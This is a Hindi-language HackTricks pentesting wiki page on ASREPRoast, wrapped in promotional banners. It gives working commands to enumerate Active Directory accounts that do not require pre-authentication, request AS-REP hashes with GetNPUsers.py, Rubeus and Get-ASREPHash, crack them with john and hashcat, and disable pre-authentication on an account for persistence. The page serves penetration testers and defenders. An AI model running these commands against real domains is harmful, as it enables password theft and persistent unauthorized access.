# ASREPRoast

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof सभी क्रिप्टो बग बाउंटी के लिए घर है।**

**देरी के बिना पुरस्कार प्राप्त करें**\
HackenProof बाउंटी केवल तब शुरू होती हैं जब उनके ग्राहक इनाम बजट जमा करते हैं। आपको इनाम उस बग को सत्यापित करने के बाद मिलेगा।

**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।

**वेब3 हैकर लीजेंड बनें**\
प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।

[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करें!

{% embed url="https://hackenproof.com/register" %}

## ASREPRoast

ASREPRoast हमला **Kerberos पूर्व-प्रमाणीकरण आवश्यक विशेषता वाले उपयोगकर्ताओं** की खोज करता है।

इसका मतलब है कि कोई भी उपयोगकर्ता AS\_REQ अनुरोध को DC को भेज सकता है उन उपयोगकर्ताओं के नाम पर और AS\_REP संदेश प्राप्त कर सकता है। इस अंतिम प्रकार का संदेश मूल उपयोगकर्ता कुंजी के साथ एन्क्रिप्ट किए गए डेटा का टुकड़ा होता है, जो उसके पासवर्ड से प्राप्त होता है। इसके बाद, इस संदेश का उपयोग करके, उपयोगकर्ता का पासवर्ड ऑफ़लाइन क्रैक किया जा सकता है।

इसके अलावा, **इस हमले को करने के लिए कोई डोमेन खाता की आवश्यकता नहीं होती है**, केवल DC से कनेक्शन होनी चाहिए। हालांकि, **डोमेन खाता के साथ**, डोमेन में **Kerberos पूर्व-प्रमाणीकरण वाले उपयोगकर्ताओं को प्राप्त करने के लिए LDAP क्वेरी** का उपयोग किया जा सकता है। **अन्यथा उपयोगकर्ता नामों को अनुमान लगाना होगा**।

#### विकल्पी रूप से विकल्पी उपयोगकर्ताओं की गणना करना (डोमेन क्रेडेंशियल की आवश्यकता होती है)
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
#### AS\_REP संदेश का अनुरोध करें

{% code title="लिनक्स का उपयोग करके" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Windows का उपयोग करें" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting के साथ Rubeus का उपयोग करने से 0x17 एन्क्रिप्शन प्रकार और 0 पूर्व प्रमाणीकरण प्रकार के साथ 4768 उत्पन्न होगा।
{% endhint %}

### क्रैकिंग
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### स्थिरता

उन उपयोगकर्ता के लिए **पूर्व-प्रमाणीकरण** अनिवार्य नहीं करें जिनके पास आपके पास **सामान्य सभी** अनुमतियाँ हैं (या गुणों को लिखने की अनुमति है):
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
## संदर्भ

[**AS-RRP Roasting के बारे में अधिक जानकारी ired.team पर**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof क्रिप्टो बग बाउंटी के लिए घर है।**

**देरी के बिना पुरस्कार प्राप्त करें**\
HackenProof बाउंटी केवल तब शुरू होती हैं जब उनके ग्राहक इनाम बजट जमा करते हैं। आपको इनाम उस बग के सत्यापन के बाद मिलेगा।

**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।

**वेब3 हैकर लीजेंड बनें**\
प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।

[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करें!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी में काम करते हैं**? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**।**
* **अपने हैकिंग ट्रिक्स को हैकट्रिक्स रेपो** (https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपने हैकिंग ट्रिक्स साझा करें।**

</details>
